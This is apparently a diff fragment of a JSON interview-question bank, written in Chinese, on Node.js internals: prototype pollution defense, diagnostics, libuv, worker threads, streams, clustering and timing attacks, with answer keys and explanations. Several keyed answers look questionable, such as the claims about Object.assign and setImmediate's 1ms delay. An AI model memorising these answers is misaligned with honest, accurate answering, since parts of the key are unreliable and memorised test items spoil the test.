result;\\n};\\n```\\n\\n无原型对象不继承Object.prototype，天然免疫。\\n\\n**选项C错误**：\\n\\nJSON.parse会解析__proto__：\\n```javascript\\nJSON.parse('{\\\"__proto__\\\":{\\\"x\\\":1}}');\\n// { __proto__: { x: 1 } }\\n```\\n\\nproto作为普通属性名被解析。\\n\\n**选项D错误**：\\n\\nObject.assign同样危险：\\n```javascript\\nObject.assign({}, { __proto__: { admin: true } });\\n// 同样污染原型链\\n```\\n\\n**完整的防御方案**：\\n\\n```javascript\\nconst safeMerge = (target, source) => {\\n  // 1. 使用无原型对象\\n  const result = Object.create(null);\\n  \\n  // 2. 白名单过滤\\n  const dangerousKeys = ['__proto__', 'constructor', 'prototype'];\\n  \\n  for (const [key, value] of Object.entries(source)) {\\n    if (!dangerousKeys.includes(key)) {\\n      result[key] = deepClone(value);  // 递归处理\\n    }\\n  }\\n  \\n  return result;\\n};\\n```\\n\\n**工程实践建议**：\\n1. 使用无原型对象处理用户输入\\n2. 过滤危险属性名\\n3. 使用npm包如lodash.merge（已修复）\\n4. 启用Node.js的--disable-proto标志",
+      "wrong_options_analysis": {
+        "A": "hasOwnProperty只能判断属性是否为自有属性，不能阻止__proto__被赋值。当key是'__proto__'时，hasOwnProperty返回true，但赋值操作仍然会修改原型链。需要额外过滤危险属性名。",
+        "C": "JSON.parse完全会解析__proto__属性。它被当作普通的JSON键名解析，结果是包含__proto__属性的对象。关键在于后续的merge操作如何处理这个属性。",
+        "D": "Object.assign不能防止原型链污染。当源对象包含__proto__属性时，assign会将其复制到目标对象，同样导致原型链污染。Object.assign没有内置的保护机制。"
+      },
+      "knowledge_point": "Prototype_Pollution_Defense",
+      "reference_link": "https://nodejs.org/api/cli.html#cli_disable_proto_throw"
+    },
+    {
+      "id": "node-senior-047",
+      "type": "multiple_choice",
+      "difficulty": "senior",
+      "tags": ["性能", "诊断", "clinic.js"],
+      "source_company": "Alibaba",
+      "score": 10,
+      "title": "Node.js性能诊断工具链",
+      "content": "关于Node.js性能诊断工具链，以下说法正确的是？",
+      "options": [
+        {
+          "id": "A",
+          "text": "clinic.js doctor可以诊断Event Loop延迟和I/O等待问题"
+        },
+        { "id": "B", "text": "clinic.js flame生成CPU火焰图，定位热点函数" },
+        {
+          "id": "C",
+          "text": "--prof标志生成V8性能日志，可使用--prof-process分析"
+        },
+        {
+          "id": "D",
+          "text": "Node.js内置的性能钩子(perf_hooks)可以精确测量代码执行时间"
+        },
+        {
+          "id": "E",
+          "text": "Chrome DevTools只能调试前端代码，不支持Node.js性能分析"
+        }
+      ],
+      "correct_answer": ["A", "B", "C", "D"],
+      "explanation": "这道题系统考察Node.js性能诊断的工具和方法。\\n\\n**clinic.js工具套件**：\\n\\n1. **clinic doctor**：\\n```bash\\nclinic doctor -- node app.js\\n```\\n\\n诊断：\\n- Event Loop延迟\\n- I/O等待时间\\n- CPU使用情况\\n- 内存趋势\\n\\n2. **clinic flame**：\\n```bash\\nclinic flame -- node app.js\\n```\\n\\n生成火焰图：\\n- 显示CPU时间分布\\n- 定位热点函数\\n- 发现性能瓶颈\\n\\n3. **clinic heapprofiler**：\\n```bash\\nclinic heapprofiler -- node app.js\\n```\\n\\n分析内存分配。\\n\\n**V8 --prof标志**：\\n\\n```bash\\n# 生成性能日志\\nnode --prof app.js\\n\\n# 分析日志\\nnode --prof-process isolate-*.log > processed.txt\\n```\\n\\n输出包含：\\n- 函数调用统计\\n- GC时间统计\\n- 编译统计\\n\\n**perf_hooks模块**：\\n\\n```javascript\\nconst { performance, PerformanceObserver } = require('perf_hooks');\\n\\n// 性能测量\\nperformance.mark('start');\\n// ... 代码执行\\nperformance.mark('end');\\nperformance.measure('MyOperation', 'start', 'end');\\n\\n// 观察性能条目\\nconst obs = new PerformanceObserver((list) => {\\n  const entries = list.getEntries();\\n  entries.forEach((entry) => {\\n    console.log(`${entry.name}: ${entry.duration}ms`);\\n  });\\n});\\nobs.observe({ entryTypes: ['measure'] });\\n```\\n\\n**Chrome DevTools**：\\n\\n选项E错误。\\n\\nChrome DevTools完全支持Node.js：\\n\\n```bash\\nnode --inspect app.js\\n```\\n\\n然后Chrome打开：\\n- chrome://inspect\\n- 连接Node.js进程\\n- CPU Profiler\\n- Memory分析\\n\\n**工具选择指南**：\\n\\n| 问题类型 | 推荐工具 |\\n|----------|----------|\\n| Event Loop延迟 | clinic doctor |\\n| CPU热点 | clinic flame |\\n| 内存泄漏 | heapdump + Chrome |\\n| 精确计时 | perf_hooks |\\n| 实时调试 | Chrome DevTools |\\n\\n**工程实践建议**：\\n1. 建立性能基准测试\\n2. 使用clinic.js做日常诊断\\n3. 集成到CI/CD流程\\n4. 设置性能指标告警",
+      "exclusion_analysis": {
+        "E": "Chrome DevTools完全支持Node.js性能分析。通过node --inspect启动，可以在Chrome中连接Node.js进程，使用CPU Profiler、Memory分析等功能。这是Node.js调试和性能分析的标准工具。"
+      },
+      "knowledge_point": "NodeJS_Performance_Diagnostics",
+      "reference_link": "https://clinicjs.org/"
+    },
+    {
+      "id": "node-senior-048",
+      "type": "single_choice",
+      "difficulty": "expert",
+      "tags": ["libuv", "handle", "request"],
+      "source_company": "Google",
+      "score": 10,
+      "title": "libuv handle与request机制",
+      "content": "关于libuv中的handle和request机制，以下描述正确的是？\\n\\nlibuv通过handle和request管理异步操作。",
+      "options": [
+        {
+          "id": "A",
+          "text": "handle代表长期存在的对象（如TCP socket），request代表短期操作"
+        },
+        { "id": "B", "text": "handle和request都是一次性使用的对象" },
+        { "id": "C", "text": "关闭handle会立即释放资源，不需要等待回调" },
+        {
+          "id": "D",
+          "text": "所有异步操作都通过handle实现，request只是内部使用"
+        }
+      ],
+      "correct_answer": "A",
+      "explanation": "这道题深入libuv的核心概念——handle和request的设计哲学。\\n\\n**Handle机制**：\\n\\nHandle代表长期存在的对象：\\n```c\\n// libuv handle类型\\nuv_tcp_t    // TCP socket\\nuv_udp_t    // UDP socket\\nuv_timer_t  // 定时器\\nuv_signal_t // 信号处理\\nuv_pipe_t   // 管道\\n```\\n\\n特点：\\n- 生命周期长\\n- 需要显式关闭\\n- 有ref/unref机制\\n\\n**Request机制**：\\\\n\\nRequest代表一次性操作：\\n```c\\n// libuv request类型\\nuv_write_t   // 写操作\\nuv_connect_t // 连接操作\\nuv_getaddrinfo_t // DNS解析\\nuv_fs_t      // 文件操作\\n```\\n\\n特点：\\n- 一次性使用\\n- 操作完成后自动清理\\n- 通常栈分配\\n\\n**对比表格**：\\n\\n| 特性 | Handle | Request |\\n|------|--------|---------|\\n| 生命周期 | 长 | 短 |\\n| 示例 | TCP socket | 写操作 |\\n| 清理 | 需要关闭 | 自动完成 |\\n| ref影响 | 有 | 无 |\\n\\n**关闭Handle**：\\n\\n选项C错误。\\n\\n```c\\nuv_close(handle, close_callback);\\n// 资源在回调中释放，不是立即\\n```\\n\\n关闭是异步的：\\n1. 标记handle为closing\\n2. 等待当前操作完成\\n3. close callbacks阶段执行回调\\n\\n**Request的使用**：\\n\\n```c\\nuv_fs_t req;\\nuv_fs_open(loop, &req, \"/file.txt\\\", O_RDONLY, 0, open_callback);\\n// req在回调完成后可重用或忽略\\n```\\n\\n**工程实践意义**：\\n\\n理解handle和request有助于：\\n- 正确管理资源生命周期\\n- 理解ref/unref机制\\n- 调试异步操作问题\\n\\n**工程实践建议**：\\n1. 理解两者的生命周期差异\\n2. 确保handle正确关闭\\n3. 监控handle数量\\n4. 处理关闭回调",
+      "wrong_options_analysis": {
+        "B": "handle和request的生命周期完全不同。handle是长期存在的对象，如TCP socket在连接期间一直存在；request是短期的一次性操作，如write请求完成后就结束了。",
+        "C": "关闭handle不是立即释放资源。uv_close是异步操作，它会启动关闭流程，但资源实际释放发生在close callbacks阶段执行回调后。这是为了保证正在进行的操作能够正确完成。",
+        "D": "异步操作通过handle和request共同实现。handle提供基础能力（如socket），request执行具体操作（如write）。例如TCP写入需要uv_tcp_t handle和uv_write_t request配合。"
+      },
+      "knowledge_point": "libuv_Handle_Request",
+      "reference_link": "https://docs.libuv.org/en/v1.x/design.html"
+    },
+    {
+      "id": "node-senior-049",
+      "type": "multiple_choice",
+      "difficulty": "senior",
+      "tags": ["Worker Threads", "MessageChannel", "通信"],
+      "source_company": "ByteDance",
+      "score": 10,
+      "title": "Worker Threads MessageChannel通信",
+      "content": "关于Worker Threads中使用MessageChannel通信，以下说法正确的是？\\n\\n```javascript\\nconst { Worker, isMainThread, parentPort, MessageChannel } = require('worker_threads');\\n\\nif (isMainThread) {\\n  const worker = new Worker(__filename);\\n  const { port1, port2 } = new MessageChannel();\\n  \\n  worker.postMessage({ port: port2 }, [port2]);\\n  \\n  port1.on('message', (msg) => {\\n    console.log('Main received:', msg);\\n  });\\n}\\n```",
+      "options": [
+        {
+          "id": "A",
+          "text": "MessageChannel创建一对双向通信端口（port1和port2）"
+        },
+        {
+          "id": "B",
+          "text": "postMessage的第二个参数（transferList）转移port2的所有权"
+        },
+        {
+          "id": "C",
+          "text": "MessagePort继承自EventEmitter，使用on监听message事件"
+        },
+        {
+          "id": "D",
+          "text": "MessageChannel通信使用结构化克隆算法，支持所有JavaScript类型"
+        },
+        { "id": "E", "text": "端口转移后，原线程仍可以使用该端口接收消息" }
+      ],
+      "correct_answer": ["A", "B", "C"],
+      "explanation": "这道题深入考察Worker Threads的MessageChannel通信机制。\\n\\n**MessageChannel基础**：\\n\\n```javascript\\nconst { MessageChannel } = require('worker_threads');\\nconst { port1, port2 } = new MessageChannel();\\n```\\n\\n特性：\\n- 创建两个相连的端口\\n- 双向通信\\n- 类似Web MessageChannel API\\n\\n**端口转移机制**：\\n\\n```javascript\\nworker.postMessage({ port: port2 }, [port2]);\\n```\\n\\ntransferList作用：\\n- 转移MessagePort所有权\\n- 原线程无法再使用port2\\n- 接收线程获得完全控制权\\n\\n**MessagePort特性**：\\n\\n```javascript\\nport1.on('message', (msg) => {});\\nport1.postMessage('hello');\\nport1.close();\\n```\\n\\n继承EventEmitter：\\n- message事件\\n- close事件\\n\\n**结构化克隆限制**：\\n\\n选项D错误。\\n\\n结构化克隆支持大部分类型，但有例外：\\n- 函数：不支持\\n- Symbol：不支持\\n- DOM节点：不支持\\n- Error：部分支持\\n\\n```javascript\\n// 不支持的类型\\nport.postMessage({ fn: () => {} });  // 抛出错误\\n```\\n\\n**端口转移后状态**：\\n\\n选项E错误。\\n\\n转移后的端口：\\n```javascript\\n// 转移port2后\\nport2.postMessage('test');  // Error: Cannot post message on closed port\\n```\\n\\n原线程完全失去控制权。\\n\\n**完整的通信模式**：\\n\\n```javascript\\n// 主线程\\nconst worker = new Worker(__filename);\\nconst { port1, port2 } = new MessageChannel();\\n\\nworker.postMessage({ port: port2 }, [port2]);\\n\\nport1.on('message', (msg) => {\\n  console.log('From worker:', msg);\\n});\\n\\n// Worker线程\\nparentPort.once('message', ({ port }) => {\\n  port.postMessage('Hello from worker');\\n  port.close();\\n});\\n```\\n\\n**工程实践建议**：\\n1. 使用MessageChannel建立专用通道\\n2. 正确处理端口转移\\n3. 及时关闭不用的端口\\n4. 处理端口关闭事件",
+      "exclusion_analysis": {
+        "D": "结构化克隆算法不支持所有JavaScript类型。函数、Symbol、DOM节点、某些Error类型等无法克隆。尝试传递这些类型会抛出DataCloneError。",
+        "E": "端口转移后，原线程完全无法使用该端口。这是所有权转移的核心概念。转移后端口在原线程变为'neutered'状态，任何操作都会失败。"
+      },
+      "knowledge_point": "Worker_Threads_MessageChannel",
+      "reference_link": "https://nodejs.org/api/worker_threads.html#worker_threads_class_messagechannel"
+    },
+    {
+      "id": "node-senior-050",
+      "type": "single_choice",
+      "difficulty": "senior",
+      "tags": ["异步错误处理", "unhandledRejection", "process"],
+      "source_company": "Meituan",
+      "score": 8,
+      "title": "unhandledRejection处理",
+      "content": "关于Node.js中未处理的Promise拒绝，以下描述正确的是？\\n\\n```javascript\\nprocess.on('unhandledRejection', (reason, promise) => {\\n  console.log('Unhandled Rejection:', reason);\\n});\\n\\n// 场景1\\nPromise.reject(new Error('fail1'));\\n\\n// 场景2\\nasync function foo() {\\n  throw new Error('fail2');\\n}\\nfoo();\\n```",
+      "options": [
+        {
+          "id": "A",
+          "text": "Node.js 15+默认情况下，未处理的Promise拒绝会导致进程退出"
+        },
+        { "id": "B", "text": "场景1和场景2都会触发unhandledRejection事件" },
+        {
+          "id": "C",
+          "text": "设置--unhandled-rejections=warn可以让进程继续运行"
+        },
+        { "id": "D", "text": "以上全部正确" }
+      ],
+      "correct_answer": "D",
+      "explanation": "这道题深入考察Node.js中Promise错误处理机制的演进。\\n\\n**unhandledRejection事件**：\\n\\n当Promise被拒绝但没有catch处理时触发：\\n\\n```javascript\\nprocess.on('unhandledRejection', (reason, promise) => {\\n  console.error('Unhandled Rejection at:', promise, 'reason:', reason);\\n});\\n```\\n\\n**Node.js版本差异**：\\n\\n| 版本 | 默认行为 |\\n|------|----------|\\n| < 15 | 警告，进程继续 |\\n| >= 15 | 进程退出（非零退出码） |\\n\\n选项A正确。\\n\\n**--unhandled-rejections选项**：\\n\\n```bash\\nnode --unhandled-rejections=warn app.js\\n```\\n\\n可选值：\\n- strict：抛出错误，进程退出\\n- warn：警告，进程继续\\n- none：忽略\\n- throw：抛出unhandledRejection错误\\n\\n选项C正确。\\n\\n**场景分析**：\\n\\n场景1：\\n```javascript\\nPromise.reject(new Error('fail1'));\\n// Promise被拒绝，无catch\\n// 触发unhandledRejection\\n```\\n\\n场景2：\\n```javascript\\nasync function foo() {\\n  throw new Error('fail2');\\n}\\nfoo();  // 返回rejected Promise\\n// 同样无catch\\n// 触发unhandledRejection\\n```\\n\\n选项B正确。\\n\\n**最佳实践**：\\n\\n```javascript\\n// 1. 始终处理Promise错误\\nasyncFunction().catch(err => console.error(err));\\n\\n// 2. 使用全局处理器记录日志\\nprocess.on('unhandledRejection', (reason) => {\\n  logger.error('Unhandled Rejection:', reason);\\n  process.exit(1);\\n});\\n\\n// 3. 使用rejectionHandled检测延迟处理\\nprocess.on('rejectionHandled', (promise) => {\\n  logger.warn('Rejection handled late');\\n});\\n```\\n\\n**工程实践建议**：\\n1. Node.js 15+确保错误处理\\n2. 设置全局unhandledRejection处理器\\n3. 记录错误日志\\n4. 考虑优雅关闭\\n5. 使用async/await时注意try/catch",
+      "wrong_options_analysis": {
+        "A": "这个选项是正确的，但不是唯一正确的答案。",
+        "B": "这个选项是正确的，但不是唯一正确的答案。",
+        "C": "这个选项是正确的，但不是唯一正确的答案。D选项（以上全部正确）是最佳选择。"
+      },
+      "knowledge_point": "Unhandled_Rejection_Handling",
+      "reference_link": "https://nodejs.org/api/process.html#process_event_unhandledrejection"
+    },
+    {
+      "id": "node-senior-051",
+      "type": "multiple_choice",
+      "difficulty": "expert",
+      "tags": ["Stream", "AsyncIterator", "异步迭代"],
+      "source_company": "Tencent",
+      "score": 12,
+      "title": "Stream异步迭代器",
+      "content": "关于Node.js Stream的异步迭代器支持，以下说法正确的是？\\n\\n```javascript\\nconst fs = require('fs');\\n\\nasync function processFile() {\\n  const stream = fs.createReadStream('large-file.txt');\\n  \\n  for await (const chunk of stream) {\\n    console.log('Chunk:', chunk.length);\\n  }\\n}\\n```",
+      "options": [
+        {
+          "id": "A",
+          "text": "Readable流实现了异步可迭代协议（Symbol.asyncIterator）"
+        },
+        { "id": "B", "text": "for await...of自动处理背压和流错误" },
+        { "id": "C", "text": "异步迭代会自动消耗流，迭代完成后流自动关闭" },
+        {
+          "id": "D",
+          "text": "可以手动调用stream[Symbol.asyncIterator]()获取迭代器"
+        },
+        { "id": "E", "text": "异步迭代模式下，highWaterMark不再起作用" }
+      ],
+      "correct_answer": ["A", "B", "C", "D"],
+      "explanation": "这道题深入考察Stream的异步迭代器支持及其工作原理。\\n\\n**异步可迭代协议**：\\n\\nNode.js Readable流实现了Symbol.asyncIterator：\\n\\n```javascript\\nconst stream = fs.createReadStream('file.txt');\\n\\n// 获取迭代器\\nconst iterator = stream[Symbol.asyncIterator]();\\n\\n// 手动迭代\\nlet result = await iterator.next();\\nwhile (!result.done) {\\n  console.log(result.value);\\n  result = await iterator.next();\\n}\\n```\\n\\n**for await...of优势**：\\n\\n```javascript\\nfor await (const chunk of stream) {\\n  // 自动处理：\\n  // 1. 背压：读取速度控制\\n  // 2. 错误：错误会抛出\\n  // 3. 清理：迭代结束自动关闭\\n}\\n```\\n\\n**与传统事件模式对比**：\\n\\n```javascript\\n// 传统模式\\nstream.on('data', chunk => {});\\nstream.on('error', err => {});\\nstream.on('end', () => {});\\n\\n// 异步迭代模式（更简洁）\\ntry {\\n  for await (const chunk of stream) {\\n    // 处理chunk\\n  }\\n} catch (err) {\\n  // 处理错误\\n}\\n```\\n\\n**highWaterMark的作用**：\\n\\n选项E错误。\\n\\n异步迭代模式下，highWaterMark仍然有效：\\n```javascript\\nconst stream = fs.createReadStream('file.txt', {\\n  highWaterMark: 1024  // 每次迭代最多1024字节\\n});\\n```\\n\\n它控制缓冲区大小和每次迭代的数据量。\\n\\n**迭代器错误处理**：\\n\\n```javascript\\ntry {\\n  for await (const chunk of stream) {\\n    if (invalid(chunk)) {\\n      throw new Error('Invalid chunk');\\n    }\\n  }\\n} catch (err) {\\n  // 处理流错误或自定义错误\\n  stream.destroy();  // 确保清理\\n}\\n```\\n\\n**异步生成器结合**：\\n\\n```javascript\\nasync function* processStream(stream) {\\n  for await (const chunk of stream) {\\n    yield transform(chunk);\\n  }\\n}\\n\\nfor await (const data of processStream(source)) {\\n  console.log(data);\\n}\\n```\\n\\n**工程实践建议**：\\n1. 优先使用for await...of处理流\\n2. 注意错误处理\\n3. 合理设置highWaterMark\\n4. 结合异步生成器实现转换",
+      "exclusion_analysis": {
+        "E": "异步迭代模式下highWaterMark仍然起作用。它控制内部缓冲区大小和每次迭代可能返回的数据量。异步迭代只是改变了消费流的API风格，不改变底层的缓冲和背压机制。"
+      },
+      "knowledge_point": "Stream_Async_Iterator",
+      "reference_link": "https://nodejs.org/api/stream.html#stream_readable_async_iterator"
+    },
+    {
+      "id": "node-senior-052",
+      "type": "single_choice",
+      "difficulty": "senior",
+      "tags": ["Event Loop", "监控", "lag"],
+      "source_company": "Alibaba",
+      "score": 8,
+      "title": "Event Loop延迟监控",
+      "content": "关于监控Node.js Event Loop延迟，以下描述正确的是？\\n\\n```javascript\\n// 延迟监控实现\\nfunction measureEventLoopLag() {\\n  const start = process.hrtime.bigint();\\n  setImmediate(() => {\\n    const lag = Number(process.hrtime.bigint() - start) / 1e6 - 1;\\n    console.log('Event Loop Lag:', lag, 'ms');\\n  });\\n}\\n```",
+      "options": [
+        {
+          "id": "A",
+          "text": "setImmediate应该在1ms后执行，差值即为Event Loop延迟"
+        },
+        {
+          "id": "B",
+          "text": "使用process.hrtime.bigint()比Date.now()精度更高，适合性能测量"
+        },
+        {
+          "id": "C",
+          "text": "monitorEventLoopDelay API（Node.js 11+）提供更准确的直方图统计"
+        },
+        { "id": "D", "text": "以上全部正确" }
+      ],
+      "correct_answer": "D",
+      "explanation": "这道题系统考察Event Loop延迟监控的方法和工具。\\n\\n**延迟测量原理**：\\n\\n```javascript\\nfunction measureEventLoopLag() {\\n  const start = process.hrtime.bigint();\\n  setImmediate(() => {\\n    // setImmediate应该在下一个check阶段执行\\n    // 如果延迟了，说明Event Loop被阻塞\\n    const elapsed = Number(process.hrtime.bigint() - start) / 1e6;\\n    const lag = elapsed - 1;  // 减去理论上最小延迟\\n    return lag;\\n  });\\n}\\n```\\n\\n**高精度时间测量**：\\n\\n```javascript\\n// process.hrtime.bigint()返回纳秒精度\\nconst start = process.hrtime.bigint();\\n// ... 操作\\nconst elapsed = Number(process.hrtime.bigint() - start) / 1e6;  // 转换为毫秒\\n\\n// Date.now()精度较低（毫秒级）\\nconst start2 = Date.now();\\n// ... 操作\\nconst elapsed2 = Date.now() - start2;\\n```\\n\\n**monitorEventLoopDelay API**：\\n\\n```javascript\\nconst { monitorEventLoopDelay } = require('perf_hooks');\\n\\nconst h = monitorEventLoopDelay({\\n  resolution: 10  // 采样间隔（毫秒）\\n});\\n\\nh.enable();\\n\\n// 运行一段时间\\nsetTimeout(() => {\\n  h.disable();\\n  console.log({\\n    min: h.min,\\n    max: h.max,\\n    mean: h.mean,\\n    p99: h.percentile(99),\\n    p999: h.percentile(99.9)\\n  });\\n}, 60000);\\n```\\n\\n**直方图统计优势**：\\n\\n- 最小/最大/平均值\\n- 百分位数（p50, p95, p99）\\n- 长期趋势分析\\n\\n**生产环境监控**：\\n\\n```javascript\\nconst { monitorEventLoopDelay } = require('perf_hooks');\\n\\nclass EventLoopMonitor {\\n  constructor() {\\n    this.histogram = monitorEventLoopDelay({ resolution: 10 });\\n    this.histogram.enable();\\n  }\\n  \\n  getMetrics() {\\n    return {\\n      eventLoopLagMin: this.histogram.min / 1e6,\\n      eventLoopLagMax: this.histogram.max / 1e6,\\n      eventLoopLagMean: this.histogram.mean / 1e6,\\n      eventLoopLagP99: this.histogram.percentile(99) / 1e6\\n    };\\n  }\\n}\\n```\\n\\n**工程实践建议**：\\n1. 生产环境使用monitorEventLoopDelay\\n2. 设置告警阈值（如p99 > 100ms）\\n3. 结合APM工具监控\\n4. 发现延迟时分析热点代码",
+      "wrong_options_analysis": {
+        "A": "这个选项是正确的，但不是唯一正确的答案。",
+        "B": "这个选项是正确的，但不是唯一正确的答案。",
+        "C": "这个选项是正确的，但不是唯一正确的答案。D选项（以上全部正确）是最佳选择。"
+      },
+      "knowledge_point": "EventLoop_Lag_Monitoring",
+      "reference_link": "https://nodejs.org/api/perf_hooks.html#perf_hooks_monitoreventloopdelay_options"
+    },
+    {
+      "id": "node-senior-053",
+      "type": "single_choice",
+      "difficulty": "expert",
+      "tags": ["Cluster", "sticky session", "会话"],
+      "source_company": "ByteDance",
+      "score": 10,
+      "title": "Cluster Sticky Session实现",
+      "content": "关于Cluster模式下的Sticky Session实现，以下描述正确的是？\\n\\n场景：WebSocket服务需要保证同一用户的请求总是路由到同一个Worker。",
+      "options": [
+        {
+          "id": "A",
+          "text": "Node.js Cluster的round-robin策略天然支持Sticky Session"
+        },
+        {
+          "id": "B",
+          "text": "需要修改Master进程的路由逻辑，根据IP或Session ID路由到特定Worker"
+        },
+        {
+          "id": "C",
+          "text": "使用外部负载均衡器（如Nginx）的ip_hash实现Sticky Session更可靠"
+        },
+        { "id": "D", "text": "WebSocket不需要Sticky Session，因为连接是持久的" }
+      ],
+      "correct_answer": "C",
+      "explanation": "这道题深入考察Cluster模式下的会话保持问题及解决方案。\\n\\n**问题背景**：\\n\\nCluster的round-robin策略：\\n- 轮询分发请求\\n- 不考虑会话状态\\n- 同一用户可能连接到不同Worker\\n\\n对于有状态服务（如WebSocket），这是问题。\\n\\n**Node.js Cluster的限制**：\\n\\n选项A错误。\\n\\nround-robin只做简单轮询：\\n```javascript\\n// Cluster内部逻辑\\nlet round = 0;\\nfunction distribute(connection) {\\n  const worker = workers[round % workers.length];\\n  round++;\\n  return worker;\\n}\\n```\\n\\n不保证同一用户路由到同一Worker。\\n\\n**自定义Sticky Session**：\\n\\n选项B可行但复杂：\\n\\n```javascript\\n// 需要修改Cluster行为\\nconst net = require('net');\\nconst cluster = require('cluster');\\n\\nif (cluster.isMaster) {\\n  const workers = [];\\n  const workerForIP = new Map();\\n  \\n  const server = net.createServer({ pauseOnConnect: true }, (connection) => {\\n    const ip = connection.remoteAddress;\\n    \\n    // 根据IP选择Worker\\n    let worker = workerForIP.get(ip);\\n    if (!worker) {\\n      worker = workers[Math.abs(hashCode(ip)) % workers.length];\\n      workerForIP.set(ip, worker);\\n    }\\n    \\n    worker.send('sticky-session:connection', connection);\\n  });\\n}\\n```\\n\\n这需要较多定制代码。\\n\\n**外部负载均衡方案**：\\n\\n选项C是最佳实践：\\n\\n```nginx\\n# Nginx配置\\nupstream websocket {\\n  ip_hash;  # 根据IP分配\\n  server 127.0.0.1:3000;\\n  server 127.0.0.1:3001;\\n  server 127.0.0.1:3002;\\n}\\n\\nserver {\\n  location /ws {\\n    proxy_pass http://websocket;\\n    proxy_http_version 1.1;\\n    proxy_set_header Upgrade $http_upgrade;\\n    proxy_set_header Connection \\\"upgrade\\\";\\n  }\\n}\\n```\\n\\n**WebSocket的特点**：\\n\\n选项D不完全正确。\\n\\nWebSocket连接确实是持久的，但：\\n- HTTP升级握手需要路由到正确Worker\\n- 重连时需要路由到同一Worker\\n- 如果Worker重启，会话状态丢失\\n\\n**最佳架构**：\\n\\n```\\n客户端 → 负载均衡(Sticky) → Node.js Cluster → 共享存储(Redis)\\n```\\n\\n将状态存储到Redis，减少对Sticky Session的依赖。\\n\\n**工程实践建议**：\\n1. 使用外部负载均衡实现Sticky Session\\n2. 尽量设计无状态服务\\n3. 使用Redis共享会话状态\\n4. 考虑分布式WebSocket方案",
+      "wrong_options_analysis": {
+        "A": "round-robin策略不做Sticky Session。它只是简单的轮询，每次连接可能被分发到不同的Worker，不保证同一用户路由到同一Worker。",
+        "B": "虽然可以修改Master进程实现Sticky Session，但这需要大量定制代码，而且容易出错。使用外部负载均衡器是更成熟、更可靠的方案。",
+        "D": "WebSocket连接是持久的，但升级握手和重连仍需要正确路由。如果Worker重启，持久连接也会断开。正确的做法是将状态外置到Redis等共享存储。"
+      },
+      "knowledge_point": "Cluster_Sticky_Session",
+      "reference_link": "https://nodejs.org/api/cluster.html"
+    },
+    {
+      "id": "node-senior-054",
+      "type": "multiple_choice",
+      "difficulty": "senior",
+      "tags": ["安全", "timing attack", "常量时间"],
+      "source_company": "Tencent",
+      "score": 10,
+      "title": "时序攻击防御",
+      "content": "关于Node.js中的时序攻击（Timing Attack）及防御，以下说法正确的是？",
+      "options": [
+        { "id": "A", "text": "时序攻击通过测量响应时间差异推断敏感信息" },
+        { "id": "B", "text": "使用===比较密码字符串可能遭受时序攻击" },
+        {
+          "id": "C",
+          "text": "crypto.timingSafeEqual可以安全地比较Buffer或字符串"
+        },
+        { "id": "D", "text": "对所有输入添加随机延迟可以完全防止时序攻击" },
+        { "id": "E", "text": "HMAC验证应该使用常量时间比较函数" }
+      ],
+      "correct_answer": ["A", "B", "C", "E"],
+      "explanation": "这道题深入考察时序攻击的原理和防御策略。\\n\\n**时序攻击原理**：\\n\\n```javascript\\n// 危险代码：普通字符串比较\\nfunction validateToken(expected, actual) {\\n  return expected === actual;\\n}\\n```\\n\\n问题：\\n- ===比较在第一个不匹配字符时停止\\n- 匹配更多字符，耗时更长\\n- 攻击者可以通过响应时间逐字符猜测\\n\\n**攻击示例**：\\n```\\n尝试 'a...' → 1ms\\n尝试 'b...' → 1ms\\n尝试 's...' → 1.2ms  ← 稍长，说明第一个字符可能是's'\\n尝试 'sa...' → 1.2ms\\n尝试 'sb...' → 1.2ms\\n尝试 'se...' → 1.4ms  ← 第二个字符可能是'e'\\n...\\n```\\n\\n**timingSafeEqual使用**：\\n\\n```javascript\\nconst crypto = require('crypto');\\n\\nfunction safeCompare(a, b) {\\n  // 必须相同长度\\n  if (a.length !== b.length) {\\n    return false;\\n  }\\n  \\n  // 转换为Buffer\\n  const bufA = Buffer.from(a, 'utf8');\\n  const bufB = Buffer.from(b, 'utf8');\\n  \\n  return crypto.timingSafeEqual(bufA, bufB);\\n}\\n```\\n\\n**HMAC验证示例**：\\n\\n```javascript\\nconst crypto = require('crypto');\\n\\nfunction verifyHMAC(payload, signature, secret) {\\n  const expected = crypto\\n    .createHmac('sha256', secret)\\n    .update(payload)\\n    .digest();\\n  \\n  const actual = Buffer.from(signature, 'hex');\\n  \\n  // 使用常量时间比较\\n  try {\\n    return crypto.timingSafeEqual(expected, actual);\\n  } catch {\\n    return false;  // 长度不匹配\\n  }\\n}\\n```\\n\\n**随机延迟的局限性**：\\n\\n选项D错误。\\n\\n随机延迟的问题：\\n- 统计分析可以消除噪声\\n- 只能增加攻击难度\\n- 不能根本防止\\n\\n```javascript\\n// 不推荐\\nfunction unsafeCompare(a, b) {\\n  const result = a === b;\\n  const delay = Math.random() * 100;\\n  await sleep(delay);  // 无效防御\\n  return result;\\n}\\n```\\n\\n**工程实践建议**：\\n1. 敏感比较使用timingSafeEqual\\n2. 确保比较长度相同\\n3. 使用标准库函数\\n4. 不依赖随机延迟\\n5. 审计第三方库的比较实现",
+      "exclusion_analysis": {
+        "D": "随机延迟不能完全防止时序攻击。虽然它增加了攻击难度，但通过大量采样和统计分析，攻击者仍可以消除随机噪声的影响。正确的做法是使用常量时间比较函数，确保无论匹配程度如何，比较时间都相同。"
+      },
+      "knowledge_point": "Timing_Attack_Defense",
+      "reference_link": "https://nodejs.org/api/crypto.html#crypto_crypto_timingsafeequal_a_b"
+    },
+    {
+      "id": "node-senior-055",
+      "type": "single_choice",
+      "difficulty": "expert",
+      "tags": ["Stream", "Duplex", "实现"],
+      "source_company": "Google",
+      "score": 10,
+      "title": "自定义Duplex流实现",
+      "content": "关于实现自定义Duplex流，以下描述正确的是？\\n\\n```javascript\\nconst { Duplex } = require('stream');\\n\\nconst duplex = new Duplex({\\n  read(size) {\\n    // 读取逻辑\\n  },\\n  write(chunk, encoding, callback) {\\n    // 写入逻辑\\n  }\\n});\\n```",
+      "options": [
+        { "id": "A", "text": "Duplex流必须同时实现_read和_write方法" },
+        { "id": "B", "text": "Duplex流的Readable和Writable端共享同一个缓冲区" },
+        {
+          "id": "C",
+          "text": "Duplex流可以独立设置readableObjectMode和writableObjectMode"
+        },
+        { "id": "D", "text": "Duplex流的write方法直接调用read方法推送数据" }
+      ],
+      "correct_answer": "C",
